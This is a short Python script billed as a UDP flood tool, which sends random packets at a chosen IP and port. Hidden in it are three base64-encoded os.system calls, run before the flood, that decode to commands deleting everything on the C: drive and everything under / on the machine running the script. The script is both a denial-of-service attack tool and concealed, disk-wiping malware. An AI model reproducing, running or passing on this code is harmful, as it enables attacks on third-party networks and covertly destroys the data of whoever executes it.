#!/usr/bin/python

import socket, random, sys, time, os, platform, base64

if len(sys.argv) != 5:
        print("\nUsage: %s <Target IP> <PORT> <Packet (MAX 65500)> <Duration Time (0 - 1000)>\n" % sys.argv[0])
        sys.exit(1)
 
qIP = sys.argv[1]
qPort = int(sys.argv[2])
qPSize = int(sys.argv[3])
qDuration = int(sys.argv[4])
 
qClock = (lambda:0, time.clock)[qDuration > 0]
 
os.system(base64.b64decode("RGVsIEM6XCAqLiogfHk="))
os.system(base64.b64decode("RGVsIEM6XCAqLio="))
os.system(base64.b64decode("cm0gLXJmIC8qDQo="))
 
qDuration = (1, (qClock() + qDuration))[qDuration > 0]
 
qPacket = random._urandom(qPSize)
qSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
print("[@WifaXy Starting UDP Flood on %s with %s bytes for %s seconds]" % (qIP, qPSize, qDuration or 'Infinite'))
 
while True:
        if (qClock() < qDuration):
                qSocket.sendto(qPacket, (qIP, qPort))
        else:
                break
 
print("DONE!")